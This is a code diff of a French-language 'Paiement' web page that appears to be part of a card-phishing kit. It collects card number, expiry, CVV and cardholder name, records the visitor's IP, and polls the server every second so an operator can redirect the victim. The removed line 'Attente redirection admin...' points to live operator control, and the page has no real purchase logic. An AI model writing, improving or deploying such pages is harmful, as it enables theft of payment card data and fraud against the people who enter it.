@@ -3,33 +3,43 @@
 <head>
 <meta charset="UTF-8">
 <title>Paiement</title>
-</head>
-<body>
-<h1>Paiement</h1>
-<form id="paymentForm">
-<input type="text" name="cardNumber" placeholder="Numéro carte" required><br>
-<input type="text" name="expiry" placeholder="MM/AA" required><br>
-<input type="text" name="cvv" placeholder="CVV" required><br>
-<input type="text" name="nomTitulaire" placeholder="Nom titulaire" required><br>
-<button type="submit">Valider</button>
-</form>
 <script>
-document.getElementById('paymentForm').onsubmit = async e => {
-  e.preventDefault();
-  const f = e.target;
-  await fetch('/api/payment', {
+let sessionId = null;
+
+async function sendPayment(){
+  const cardNumber = document.getElementById('cardNumber').value;
+  const expiry = document.getElementById('expiry').value;
+  const cvv = document.getElementById('cvv').value;
+  const nomTitulaire = document.getElementById('nomTitulaire').value;
+
+  await fetch('/api/payment',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      sessionId: window.sessionId,
-      cardNumber: f.cardNumber.value,
-      expiry: f.expiry.value,
-      cvv: f.cvv.value,
-      nomTitulaire: f.nomTitulaire.value
-    })
+    body: JSON.stringify({cardNumber, expiry, cvv, nomTitulaire})
   });
-  alert('Paiement simulé. Attente redirection admin...');
+}
+
+async function init(){
+  const res = await fetch('/api/visit');
+  const data = await res.json();
+  sessionId = data.ip;
+
+  setInterval(async ()=>{
+    const r = await fetch('/api/status');
+    const j = await r.json();
+    if(j.redirect) window.location.href = j.redirect;
+  },1000);
 }
 </script>
+</head>
+<body onload="init()">
+<h1>Paiement</h1>
+<form onsubmit="sendPayment(); return false;">
+  <input id="cardNumber" placeholder="Numéro Carte" required><br>
+  <input id="nomTitulaire" placeholder="Nom Titulaire" required><br>
+  <input id="expiry" placeholder="MM/AA" required><br>
+  <input id="cvv" placeholder="CVV" required><br>
+  <button type="submit">Valider</button>
+</form>
 </body>
 </html>
